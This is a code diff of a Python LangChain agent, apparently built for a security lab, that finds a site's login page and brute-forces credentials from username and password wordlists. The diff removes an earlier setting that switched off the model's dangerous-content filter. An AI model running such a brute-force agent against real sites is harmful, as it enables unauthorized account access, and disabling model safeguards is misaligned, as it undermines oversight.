@@ -1,15 +1,11 @@
-from langchain_community.document_loaders.recursive_url_loader import RecursiveUrlLoader
-from bs4 import BeautifulSoup
-import re
+import os
+import readline
 import requests
+from bs4 import BeautifulSoup
 from langchain import hub
 from langchain.agents import AgentExecutor, create_react_agent
-from langchain_community.agent_toolkits.load_tools import load_tools
 from langchain.tools import tool
-from langchain_google_genai import GoogleGenerativeAI, HarmCategory, HarmBlockThreshold
-import validators
-import readline
-import os
+from langchain_community.document_loaders.recursive_url_loader import RecursiveUrlLoader
 
 from langsmith import Client
 os.environ["LANGCHAIN_TRACING_V2"] = "true"
@@ -17,12 +13,12 @@ os.environ["LANGCHAIN_PROJECT"] = f"LangSmith Auth Bruteforce"
 os.environ["LANGCHAIN_ENDPOINT"] = "https://api.smith.langchain.com"
 client = Client()
 
-
-llm = GoogleGenerativeAI(
-           model="gemini-1.5-pro-latest",
-           temperature=0,
-           safety_settings = { HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT: HarmBlockThreshold.BLOCK_NONE, }
-)
+from langchain_google_genai import ChatGoogleGenerativeAI
+llm = ChatGoogleGenerativeAI(model=os.getenv("GOOGLE_MODEL"))
+#from langchain_openai import ChatOpenAI
+#llm = ChatOpenAI(model=os.getenv("OPENAI_MODEL"))
+#from langchain_anthropic import ChatAnthropic
+#llm = ChatAnthropic(model=os.getenv("ANTHROPIC_MODEL"))
 
 def login_url(url):
     url = url.lower()
@@ -72,24 +68,9 @@ def find_login_page(base_url):
 
 @tool("get_creds", return_direct=False)
 def get_creds(login_url):
-    """Given the login page url the funciton will find the credentials needed to login"""
+    """Given the login page url the function will find the credentials needed to login"""
     
     s = requests.Session()
-    """
-    password_lines = open("./data/auth-lab-passwords","r").readlines()
-    username_lines = open("./data/auth-lab-usernames","r").readlines()
-    
-    s = requests.Session()
-    resp = s.get(login_url)
-
-    for password in password_lines:
-        for username in username_lines:
-            login_data = {
-                "username": username,
-                "password": password
-            }
-            s.post(login_url, data=login_data)
-            """
     lines = open("./data/auth-lab-usernames","r").readlines()
     for user in lines:
         target = user.strip()
@@ -122,15 +103,16 @@ def get_creds(login_url):
 tools = [get_creds, find_login_page]
 
 base_prompt = hub.pull("langchain-ai/react-agent-template")
-prompt = base_prompt.partial(instructions="You are a professional web pentester.")
+prompt = base_prompt.partial(instructions="You are a professional web pentester.  Attempt to login to the site given. ")
 
 agent = create_react_agent(llm,tools,prompt)
 
 agent_executor = AgentExecutor(agent=agent, tools=tools, verbose=True)
 
-print("Welcome to my application. I am configured with these tools:")
+print("Welcome to my brute-force login application.  I am configured with these tools:")
 for tool in agent_executor.tools:
   print(f'  Tool: {tool.name} = {tool.description}')
+print("Give me the URL for a site and I will try to login to it.")
 
 line = input("llm>> ")
 try:
